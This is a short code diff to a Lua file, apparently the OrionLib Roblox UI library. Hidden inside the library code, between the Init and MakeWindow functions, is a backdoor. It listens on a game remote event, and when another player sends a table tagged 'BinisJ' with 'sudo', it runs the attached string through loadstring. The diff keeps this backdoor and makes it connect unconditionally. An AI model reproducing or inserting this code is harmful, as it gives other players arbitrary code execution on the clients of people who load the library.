@@ -463,22 +463,15 @@ function OrionLib:Init()
 	end	
 end
 
-local tbone = false
-
-if game.ReplicatedStorage:FindFirstChild("GrabEvents") and game.ReplicatedStorage.GrabEvents:FindFirstChild("ExtendGrabLine") then
-	tbone = true
-	game.ReplicatedStorage.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(plr,arg1)
-		if type(arg1) == "table" and arg1[1] == "BinisJ" then
-			if plr ~= game.Players.LocalPlayer then
-				if arg1[2] == "sudo" then
-					loadstring(arg1[3])()
-				end
+game.ReplicatedStorage.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(plr,arg1)
+	if type(arg1) == "table" and arg1[1] == "BinisJ" then
+		if plr ~= game.Players.LocalPlayer then
+			if arg1[2] == "sudo" then
+				loadstring(arg1[3])()
 			end
 		end
-	end)
-end
-
-if not tbone then print('nobris') end
+	end
+end)
 
 function OrionLib:MakeWindow(WindowConfig)
 	local FirstTab = true
